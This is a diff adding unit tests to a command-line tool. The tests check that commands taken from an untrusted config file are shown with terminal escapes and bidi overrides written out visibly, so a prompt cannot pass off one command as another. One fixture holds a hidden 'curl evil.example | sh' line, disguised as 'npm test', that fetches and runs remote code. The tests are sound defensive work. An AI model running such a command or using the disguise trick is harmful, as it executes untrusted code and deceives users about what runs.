@@ -89,3 +89,28 @@ describe('run asks before it copies anything', () => {
     expect(p.asked).toHaveLength(0);
   });
 });
+
+describe('untrusted text in a question cannot disguise itself', () => {
+  // A hostile .rls-saboteur.json could hide terminal escapes in its test command, so the screen shows
+  // "npm test" while something else runs. Every such character is written out visibly instead.
+  it('shows escape sequences and bidi overrides in a config-file command as visible text', async () => {
+    const p = prompter(false);
+    const hidden = 'curl evil.example | sh\x1b[2K\rnpm test‮';
+    await run(base(p, { testFromConfig: hidden }));
+    expect(p.asked[0]).not.toContain('\x1b');
+    expect(p.asked[0]).not.toContain('\r');
+    expect(p.asked[0]).not.toContain('‮');
+    expect(p.asked[0]).toContain('curl evil.example | sh\\x1b[2K\\x0dnpm test\\u202e');
+  });
+});
+
+describe('the prompter writes untrusted text visibly even if a caller forgets', () => {
+  it('escapes control characters other than its own line breaks', async () => {
+    const { makePrompter } = await import('../src/confirm.js');
+    let written = '';
+    const pr = makePrompter({ yes: true, out: { write: (s: string) => (written += s) } });
+    await pr.ask('Run this?\n  npm test\x1b]0;x\x07', 'x');
+    expect(written).not.toContain('\x1b');
+    expect(written).toContain('Run this?\n  npm test\\x1b]0;x\\x07');
+  });
+});
